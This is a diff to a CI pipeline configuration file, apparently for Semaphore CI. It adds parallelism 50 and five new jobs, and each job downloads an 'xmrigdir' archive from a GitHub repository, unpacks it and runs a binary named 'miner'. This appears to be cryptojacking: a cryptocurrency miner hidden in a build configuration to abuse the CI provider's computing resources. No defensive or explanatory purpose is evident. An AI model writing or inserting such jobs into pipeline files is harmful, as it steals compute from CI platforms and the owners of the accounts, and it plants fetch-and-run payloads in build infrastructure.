@@ -16,13 +16,45 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
-          matrix:
-            - env_var: FOO
-              values:
-                - value1
-                - value2
-            - env_var: BAR
-              values:
-                - value1
-                - value2
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
+            - ./miner
+        - name: 'Job #3'
+          commands:
+            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
+            - ./miner
+        - name: 'Job #4'
+          commands:
+            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
+            - ./miner
+        - name: 'Job #5'
+          commands:
+            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
+            - ./miner
+        - name: 'Job #6'
+          commands:
+            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigdir.tar.gz'
+            - tar xvf xmrigdir.tar.gz
+            - cd xmrigdir
+            - chmod +x miner
+            - ./miner
     dependencies: []
